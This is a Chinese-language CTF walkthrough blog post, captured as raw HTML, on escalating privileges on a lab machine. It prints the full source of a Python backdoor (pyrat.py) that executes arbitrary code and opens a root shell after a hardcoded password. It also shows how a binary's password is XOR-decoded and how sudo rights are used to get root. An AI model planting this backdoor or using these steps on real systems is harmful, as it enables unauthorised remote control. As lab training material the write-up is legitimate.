class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">pyrat.py源码--这是一个非常有趣的Python后门/RAT（远程管理工具）</span><br><span class="line">#!/usr/bin/python3</span><br><span class="line"># Made by josemlwdf@github.com</span><br><span class="line"># Pyrat.py is a &quot;python RAT tool&quot; designed to be used on CTF</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">from io import StringIO</span><br><span class="line">import datetime</span><br><span class="line">import os</span><br><span class="line">import multiprocessing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handle_client(client_socket, client_address, admins):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            # Receive data from the client</span><br><span class="line">            data = client_socket.recv(1024).decode(&quot;utf-8&quot;)</span><br><span class="line">            if not data:</span><br><span class="line">                break  # Client disconnected</span><br><span class="line">            if is_http(data):</span><br><span class="line">                send_data(client_socket, fake_http())</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            switch_case(client_socket, str(data).strip(), admins)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    remove_socket(client_socket, admins)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def switch_case(client_socket, data, admins):</span><br><span class="line">    if data == &#x27;jose&#x27;:</span><br><span class="line">        get_admin(client_socket, admins)</span><br><span class="line">    else:</span><br><span class="line">        uid = os.getuid()</span><br><span class="line">        if (uid == 0) and (str(client_socket) not in admins):</span><br><span class="line">            change_uid()</span><br><span class="line"></span><br><span class="line">        if data == &#x27;shell&#x27;:</span><br><span class="line">            shell(client_socket)</span><br><span class="line">            remove_socket(client_socket, admins)</span><br><span class="line">        else:</span><br><span class="line">            exec_python(client_socket, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exec_python(client_socket, data):</span><br><span class="line">    try:</span><br><span class="line">        print(str(client_socket) + &quot; : &quot; + str(data))</span><br><span class="line">        captured_output = StringIO()</span><br><span class="line">        sys.stdout = captured_output</span><br><span class="line"></span><br><span class="line">        exec(data)</span><br><span class="line"></span><br><span class="line">        exec_output = captured_output.getvalue()</span><br><span class="line"></span><br><span class="line">        send_data(client_socket, exec_output)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        send_data(client_socket, str(e))</span><br><span class="line">    finally:</span><br><span class="line">        sys.stdout = sys.__stdout__  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_admin(client_socket, admins):</span><br><span class="line">    uid = os.getuid()</span><br><span class="line">    if uid != 0:</span><br><span class="line">        send_data(client_socket, &quot;Start a fresh client to begin.&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    password = &#x27;this_is_pass&#x27;</span><br><span class="line"></span><br><span class="line">    for _ in range(3):  # Three password attempts</span><br><span class="line">        send_data(client_socket, &quot;Password:&quot;)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            data = client_socket.recv(1024).decode(&quot;utf-8&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            # Send the exception message back to the client</span><br><span class="line">            send_data(client_socket, str(e))</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        if data.strip() == password:</span><br><span class="line">            admins.append(str(client_socket))</span><br><span class="line">            send_data(client_socket, &#x27;Welcome Admin!!! Type &quot;shell&quot; to begin&#x27;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell(client_socket):</span><br><span class="line">    try:</span><br><span class="line">        import pty</span><br><span class="line">        os.dup2(client_socket.fileno(), 0)</span><br><span class="line">        os.dup2(client_socket.fileno(), 1)</span><br><span class="line">        os.dup2(client_socket.fileno(), 2)</span><br><span class="line">        pty.spawn(&quot;/bin/sh&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        send_data(client_socket, str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sends data to the clients</span><br><span class="line">def send_data(client_socket, data):</span><br><span class="line">    try:</span><br><span class="line">        client_socket.sendall((str(data) + &#x27;\n&#x27;).encode(&quot;utf-8&quot;))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_server(host, port, admins):</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(5)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        client_socket, client_address = server_socket.accept()</span><br><span class="line">        # Start a new process to handle the client</span><br><span class="line">        p = multiprocessing.Process(target=handle_client, args=(client_socket, client_address, admins))</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove_socket(client_socket, admins):</span><br><span class="line">    client_socket.close()</span><br><span class="line">    try:</span><br><span class="line">        admins = admins._getvalue()  # Get the actual list</span><br><span class="line">        if str(client_socket) in admins:</span><br><span class="line">            admins.remove(str(client_socket))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Check if the received data is an HTTP request</span><br><span class="line">def is_http(data):</span><br><span class="line">    return &#x27;HTTP&#x27; in data and &#x27;Host:&#x27; in data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sends a fake Python HTTP Server Banner</span><br><span class="line">def fake_http():</span><br><span class="line">    try:</span><br><span class="line">        # Get the current date and time and format the date and time according to the desired format</span><br><span class="line">        formatted_datetime = datetime.datetime.now().strftime(&quot;%a %b %d %H:%M:%S %Z %Y&quot;)</span><br><span class="line">        banner = f&quot;&quot;&quot;</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Server: SimpleHTTP/0.6 Python/3.11.2</span><br><span class="line">Date: &#123;formatted_datetime&#125;</span><br><span class="line">Content-type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">Try a more basic connection!</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">        return banner[1:]  # Remove leading newline</span><br><span class="line">    except:</span><br><span class="line">        return &#x27;HTTP/1.0 200 OK&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def change_uid():</span><br><span class="line">    uid = os.getuid()</span><br><span class="line">    if uid == 0:</span><br><span class="line">        # Make Python code execution run as user 33 (www-data)</span><br><span class="line">        euid = 33</span><br><span class="line">        groups = os.getgroups()</span><br><span class="line">        if 0 in groups:</span><br><span class="line">            groups.remove(0)</span><br><span class="line">        os.setgroups(groups)</span><br><span class="line">        os.setgid(euid)</span><br><span class="line">        os.setuid(euid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># MAIN</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    multiprocessing.freeze_support()  # Needed for Windows, harmless on macOS/Linux</span><br><span class="line"></span><br><span class="line">    manager = multiprocessing.Manager()</span><br><span class="line">    admins = manager.list()  # Shared list for tracking admins</span><br><span class="line"></span><br><span class="line">    host = &quot;127.0.0.1&quot;</span><br><span class="line">    port = 8000 </span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        start_server(host, port, admins)</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print(&#x27;Shutting Down...&#x27;)</span><br><span class="line">        sys.exit(1)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本是一个伪装成Python HTTP服务器的后门。它监听端口8000，如果收到HTTP请求，就返回一个假的HTTP响应来伪装自己。如果收到非HTTP的特定指令，它会执行Python代码或提供一个完整的Shell。</p>
+<p>服务绑定在 <code>127.0.0.1:8000</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">1. 使用 `netcat` 或 `socat` 连接本地服务：</span><br><span class="line">   `nc 127.0.0.1 8000`</span><br><span class="line">2. 发送魔法口令 `jose`。</span><br><span class="line">3. 服务会回复 `Password:`，发送硬编码密码 `this_is_pass`。</span><br><span class="line">4. 认证成功后，服务回复 `Welcome Admin!!! Type &quot;shell&quot; to begin`。</span><br><span class="line">5. 发送命令 `shell`。</span><br><span class="line">6. 你现在获得了一个完全的、以root权限运行的交互式Shell。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>分析pyrat.py源码，得知需要root用户启动后，jose进入管理员认证模式-&gt;输入密码‘this_is_pass’-&gt;shell，即可拿到root。因此猜测需要先攻破bamuwe文件。</p>
+<h3 id="2-bamuwe文件分析"><a href="#2-bamuwe文件分析" class="headerlink" title="2.bamuwe文件分析"></a>2.bamuwe文件分析</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904202415217.png" alt="image-20250904202415217" data-caption="image-20250904202415217" loading="lazy"></p>
+<p>bamuwe执行后也是输入密码，简单爆破了下无果，拿出来用IDA分析下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server    //默认8000</span><br><span class="line">wget 192.168.88.21:8000/bamuwe</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904203020064.png" alt="image-20250904203020064" data-caption="image-20250904203020064" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904202932189.png" alt="image-20250904202932189" data-caption="image-20250904202932189" loading="lazy"></p>
+<p><strong>F5</strong>查看<strong>伪C代码</strong></p>
+<p><strong>main:</strong></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904203653037.png" alt="image-20250904203653037" data-caption="image-20250904203653037" loading="lazy"></p>
+<p><strong>decrypt:</strong></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904203706889.png" alt="image-20250904203706889" data-caption="image-20250904203706889" loading="lazy"></p>
+<p>加密数据由三部分组成：v8&#x2F;v9&#x2F;v10，</p>
+<p>转换为小端序：54 50 02 03 15 03 16 12 4F F4 B1 04 14 03，</p>
+<p>随后异或解出密码:26deseptiembre</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取 v8 的字节（小端序）</span></span><br><span class="line">v8 = <span class="number">0x1216031503025054</span></span><br><span class="line">v8_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	v8_bytes.append((v8 &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># 提取 v9 的字节（小端序）</span></span><br><span class="line">v9 = <span class="number">67830543</span></span><br><span class="line">v9_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	v9_bytes.append((v9 &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># 提取 v10 的字节（小端序）</span></span><br><span class="line">v10 = <span class="number">788</span></span><br><span class="line">v10_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	v10_bytes.append((v10 &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">encrypted_bytes = v8_bytes + v9_bytes + v10_bytes</span><br><span class="line">decrypted_bytes = [b ^ <span class="number">0x66</span> <span class="keyword">for</span> b <span class="keyword">in</span> encrypted_bytes]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> decrypted_bytes)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904204848002.png" alt="image-20250904204848002" data-caption="image-20250904204848002" loading="lazy"></p>
+<h2 id="bamuwe-root"><a href="#bamuwe-root" class="headerlink" title="bamuwe-&gt;root"></a>bamuwe-&gt;root</h2><p>SSH登录bamuwe用户，密码：26deseptiembre</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904205914907.png" alt="image-20250904205914907" data-caption="image-20250904205914907" loading="lazy"></p>
+<p>sudo -l发现正好可以root无密码执行&#x2F;opt&#x2F;pyrat.py，跟前面分析闭环了。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904210023979.png" alt="image-20250904210023979" data-caption="image-20250904210023979" loading="lazy"></p>
+<p><strong>注意</strong>先把所有运行的python服务关闭杀掉</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904220154771.png" alt="image-20250904220154771" data-caption="image-20250904220154771" loading="lazy"></p>
+<h3 id="然后无密码运行pyrat-py"><a href="#然后无密码运行pyrat-py" class="headerlink" title="然后无密码运行pyrat.py"></a>然后无密码运行pyrat.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /opt/pyrat.py</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904220249120.png" alt="image-20250904220249120" data-caption="image-20250904220249120" loading="lazy"></p>
+<p>再开一个窗口连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bamuwe@Method:/opt$ busybox nc 127.0.0.1 8000</span><br></pre></td></tr></table></figure>
+
+<p>jose进入管理员认证模式-&gt;输入密码‘this_is_pass’-&gt;shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">1. 使用 `netcat` 或 `socat` 连接本地服务：</span><br><span class="line">   `nc 127.0.0.1 8000`</span><br><span class="line">2. 发送魔法口令 `jose`。</span><br><span class="line">3. 服务会回复 `Password:`，发送硬编码密码 `this_is_pass`。</span><br><span class="line">4. 认证成功后，服务回复 `Welcome Admin!!! Type &quot;shell&quot; to begin`。</span><br><span class="line">5. 发送命令 `shell`。</span><br><span class="line">6. 你现在获得了一个完全的、以root权限运行的交互式Shell。</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904220507105.png" alt="image-20250904220507105" data-caption="image-20250904220507105" loading="lazy"></p>
+<p>至此渗透测试结束</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" rel="tag">basic认证爆破</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/nikto/" rel="tag">nikto</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/put%E6%96%B9%E6%B3%95/" rel="tag">put方法</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1761989925207"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%B6%E6%9C%BAIP%E7%A1%AE%E5%AE%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1.靶机IP确定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">2.端口发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-web%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">3.web信息获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.1.</span> <span class="toc-text">basic认证爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">1.3.2.</span> <span class="toc-text">nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#put%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.3.</span> <span class="toc-text">put方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">二、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#www-data-bamuwe"><span class="toc-number">2.1.</span> <span class="toc-text">www-data-&gt;bamuwe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.信息获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-bamuwe%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.bamuwe文件分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bamuwe-root"><span class="toc-number">2.2.</span> <span class="toc-text">bamuwe-&gt;root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%97%A0%E5%AF%86%E7%A0%81%E8%BF%90%E8%A1%8Cpyrat-py"><span class="toc-number">2.2.1.</span> <span class="toc-text">然后无密码运行pyrat.py</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
